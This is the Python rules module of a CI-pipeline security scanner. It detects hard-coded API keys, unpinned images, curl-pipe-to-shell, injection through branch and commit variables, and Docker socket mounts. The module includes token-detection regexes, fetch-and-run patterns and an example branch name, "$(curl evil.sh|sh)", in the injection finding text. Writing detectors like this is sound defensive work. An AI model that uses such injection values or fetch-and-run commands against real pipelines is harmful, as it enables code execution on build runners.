"""cicheck rules.

Findings are drawn from the raw text (so line numbers are real) plus the parsed
YAML where structure matters. Each rule is intentionally narrow so a normal
pipeline stays quiet.
"""

from __future__ import annotations

import re

from cicheck.checks.base import Finding, Pipeline

# --- secrets -----------------------------------------------------------------
_SECRET_PATTERNS = [
    (re.compile(r"sk-ant-[A-Za-z0-9_-]{20,}"), "Anthropic key"),
    (re.compile(r"sk-[A-Za-z0-9]{20,}"), "sk- key"),
    (re.compile(r"(?:sk|rk|pk)_(?:live|test)_[A-Za-z0-9]{16,}"), "Stripe key"),
    (re.compile(r"gh[pousr]_[A-Za-z0-9]{30,}"), "GitHub token"),
    (re.compile(r"github_pat_[A-Za-z0-9_]{30,}"), "GitHub PAT"),
    (re.compile(r"glpat-[A-Za-z0-9_-]{20,}"), "GitLab PAT"),
    (re.compile(r"xox[baprs]-[A-Za-z0-9-]{10,}"), "Slack token"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS access key id"),
    (re.compile(r"AIza[0-9A-Za-z_-]{30,}"), "Google API key"),
    (re.compile(r"SG\.[A-Za-z0-9_-]{16,}\.[A-Za-z0-9_-]{16,}"), "SendGrid key"),
    (re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----"), "private key"),
]

# --- images ------------------------------------------------------------------
# image: name[:tag]  - flag missing tag or :latest, allow @sha256 digests and
# variable-based names.
_IMAGE_RE = re.compile(r"(?m)^\s*(?:-\s*)?image\s*:\s*[\"']?([^\"'\s#]+)")

# --- fetch-and-run -----------------------------------------------------------
_CURL_SHELL_RE = re.compile(
    r"(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:bash|sh|zsh)\b|"
    r"\b(?:iwr|irm)\b[^\n|]*\|\s*(?:iex)\b",
    re.IGNORECASE,
)

# --- shell injection ---------------------------------------------------------
# Attacker-controlled predefined variables. If these reach a shell script they
# let someone put code in a branch name / commit message / MR title.
_TAINTED = re.compile(
    r"\$\{?(" + "|".join([
        "CI_COMMIT_MESSAGE", "CI_COMMIT_TITLE", "CI_COMMIT_DESCRIPTION",
        "CI_COMMIT_REF_NAME", "CI_COMMIT_BRANCH", "CI_COMMIT_TAG",
        "CI_MERGE_REQUEST_TITLE", "CI_MERGE_REQUEST_DESCRIPTION",
        "CI_MERGE_REQUEST_SOURCE_BRANCH_NAME", "CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME",
        "CIRCLE_BRANCH", "CIRCLE_TAG", "CIRCLE_PR_TITLE",
        "BITBUCKET_BRANCH", "BITBUCKET_TAG", "BITBUCKET_PR_DESTINATION_BRANCH",
        "BUILD_SOURCEBRANCHNAME", "SYSTEM_PULLREQUEST_SOURCEBRANCH",
    ]) + r")\b",
)

_DOCKER_SOCK_RE = re.compile(r"/var/run/docker\.sock")


def _find_line(text: str, needle: str) -> int | None:
    for i, line in enumerate(text.splitlines(), 1):
        if needle in line:
            return i
    return None


# Keys whose values are shell scripts, across the supported platforms.
_SCRIPT_KEYS = {
    "script", "before_script", "after_script", "commands", "command",
    "run", "bash", "sh", "pwsh", "powershell", "cmd",
}


def _collect_scripts(data) -> list[str]:
    """Pull the shell-script bodies out of parsed CI YAML, so checks that only
    make sense in a script (injection, curl|bash) don't fire on rules/if
    conditions, variable names or comments."""
    out: list[str] = []

    def add(val):
        if isinstance(val, str):
            out.append(val)
        elif isinstance(val, list):
            for item in val:
                if isinstance(item, str):
                    out.append(item)
                elif isinstance(item, dict):
                    walk(item)
        elif isinstance(val, dict):
            walk(val)

    def walk(obj):
        if isinstance(obj, dict):
            for k, v in obj.items():
                if isinstance(k, str) and k.lower() in _SCRIPT_KEYS:
                    add(v)
                else:
                    walk(v)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return out


def check(p: Pipeline) -> list[Finding]:
    findings: list[Finding] = []
    text = p.text

    # CC001 hard-coded secrets
    for rx, label in _SECRET_PATTERNS:
        m = rx.search(text)
        if m:
            findings.append(Finding(
                "hardcoded-secret",
                f"Hard-coded {label} in CI config",
                "A real-looking credential is written into the pipeline file. "
                "Anyone with repo read access has it, and it is in git history. "
                "Move it to a masked/protected CI variable and rotate the key.",
                "critical", p.path, _find_line(text, m.group(0)[:12]),
                {"kind": label},
            ))
            break

    # CC010 unpinned images
    for m in _IMAGE_RE.finditer(text):
        name = m.group(1)
        if "$" in name or "@sha256:" in name or "{" in name:
            continue  # variable or digest-pinned
        tag = name.rsplit(":", 1)[1] if ":" in name.rsplit("/", 1)[-1] else None
        if tag is None or tag == "latest":
            findings.append(Finding(
                "unpinned-image",
                "Unpinned container image",
                "The image has no fixed tag (or uses :latest), so the build can "
                "silently pull different, possibly malicious, contents over time. "
                "Pin a specific tag, ideally by @sha256 digest.",
                "medium", p.path, _find_line(text, m.group(0).strip()),
                {"image": name},
            ))
            break

    # Injection and curl|bash only make sense inside actual scripts. When the
    # YAML would not parse, fall back to the whole text.
    scripts = _collect_scripts(p.data) if p.data is not None else [text]
    script_blob = "\n".join(scripts)

    # CC020 curl | shell
    m = _CURL_SHELL_RE.search(script_blob)
    if m:
        findings.append(Finding(
            "curl-pipe-shell",
            "Pipes a downloaded script straight into a shell",
            "The pipeline downloads a script and runs it immediately. Whatever the "
            "server returns at build time runs with the job's credentials, and it "
            "can change after review. Pin and vendor what you run.",
            "medium", p.path, _find_line(text, m.group(0)[:20]),
            {"match": " ".join(m.group(0).split())[:120]},
        ))

    # CC030 shell injection from attacker-controlled variables
    m = _TAINTED.search(script_blob)
    if m:
        findings.append(Finding(
            "shell-injection",
            "Attacker-controlled variable used in a script",
            "A branch name, commit message or MR/PR title is interpolated into a "
            "shell command. Someone can put shell code in that value (e.g. a "
            "branch named \"$(curl evil.sh|sh)\") and have the runner execute it. "
            "Pass it through an intermediate environment variable and quote it.",
            "high", p.path, _find_line(text, m.group(0)),
            {"variable": m.group(1)},
        ))

    # CC040 docker socket
    m = _DOCKER_SOCK_RE.search(text)
    if m:
        findings.append(Finding(
            "docker-socket",
            "Docker socket mounted into the job",
            "Mounting /var/run/docker.sock gives the job full control of the host "
            "Docker daemon, which is root-equivalent on the runner. A compromised "
            "dependency in the job can take over the runner.",
            "high", p.path, _find_line(text, "/var/run/docker.sock"),
            {},
        ))

    return findings
